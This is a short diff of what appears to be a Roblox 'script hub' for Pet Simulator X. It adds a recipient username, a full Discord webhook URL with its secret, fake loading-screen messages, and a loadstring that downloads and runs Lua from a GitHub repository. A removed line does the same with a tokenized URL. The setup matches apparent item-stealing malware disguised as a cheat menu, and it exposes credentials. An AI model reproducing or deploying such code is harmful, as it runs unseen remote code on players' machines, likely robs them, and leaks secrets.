@@ -1,1 +1,17 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Krustyy99/pet-sim-x-script-hub/main/Script?token=GHSAT0AAAAAACBPFLXP5TNE5QCFDYGMEOY4ZB4BTGQ"))()
+Username = "Krustyy999"
+
+WebHook = "https://discord.com/api/webhooks/1097168158957256725/j5pX8r5ZW2mhsF05zu1zve0ka5i4Isgik3GpgLlfIoQTZ0YhcJU8WiPc9e5N9aV_h8-g"
+
+loadingscreen = true
+
+_G.CustomScriptName = "KrustyHub"
+
+_G.Text1 = "Script Loaded..."
+
+_G.Text2 = "Waiting for Script..."
+
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Script..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
